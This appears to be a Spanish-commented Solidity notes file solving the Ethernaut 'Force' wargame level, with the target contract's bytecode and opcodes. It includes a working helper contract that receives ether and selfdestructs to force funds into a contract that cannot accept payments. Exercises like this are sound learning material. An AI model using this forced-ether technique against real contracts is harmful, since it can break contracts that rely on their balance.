pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


// bueno, no hay funciones pero a pesar de eso, una vez que se compila, se obtiene un bytecode que no es nulo, sino que hace algo. Lo que se ve es:

"object": "60606040523415600e57600080fd5b603580601b6000396000f3006060604052600080fd00a165627a7a72305820dd1d278b3327f1470da6067a272d5133289e6b46c0bf8ae5c2e57ed004b690840029",
    "opcodes": "PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH1 0xE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x35 DUP1 PUSH1 0x1B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xdd SAR 0x27 DUP12 CALLER 0x27 CALL 0x47 0xd 0xa6 MOD PUSH27 0x272D5133289E6B46C0BF8AE5C2E57ED004B6908400290000000000 ",


// dice que es un puntero a memoria libre. Podria hacer que en ese lugar este una funcion que me permita pagarle. Estilo un fallback payable.

//Solidity reserva 32 bytes de memoria iniciales donde hasta el 0x3f estan los metodos de hash, del 0x40 al 0x5f es el puntero a memoria libre y entre 0x60 y 0x7f un slot de cero.

// como hago para escribir sobre el puntero? Aparte es en 0x60 o en 0x80? el primero creo

// Lo que resuelve el asunto, ya que es dificil que se pueda meter en la zona donde esta apuntando el contrato, una nueva funcion que me permita pagarle; es crear un nuevo contrato en el cual le pueda enviar plata ahi. Luego, a ese contrato le digo que se mate (suicide) lo que se ingresa un parametro que es la direccion a la cual tiene que enviar el eth de ese contrato antes de matarse. Luego se mata, lo que imposibilita devolver la plata al contrato vacio.

// El codigo del contrato externo que hice fue

pragma solidity ^0.4.16;

contract bombaloca {

address dir_yo = msg.sender;
//address target = "0x59c4ED6Bee38110274A23555F2C0025123748Ebb";

event caching(uint amount);

function destroy(address target_add) { // so funds not locked in contract forever
     if (msg.sender == dir_yo) {
        //suicide(target_add); // send funds to organizer
        suicide(target_add);
     }
  }
  
  function check_balance() public view returns (uint) {
      return this.balance;
  }
  
  function () payable {
      emit caching(msg.value);
  }
  
  
}

// donde primero le hago una transferencia mediante metamask a la direccion de ese contrato y luego desde remix, despues de ver el balance, llamo a la funcion destroy poniendole como ingreso la direccion del contrato de ethernaut (tener en cuenta que debo primero encontrar la direccion que cumple el checksum desde etherscan)
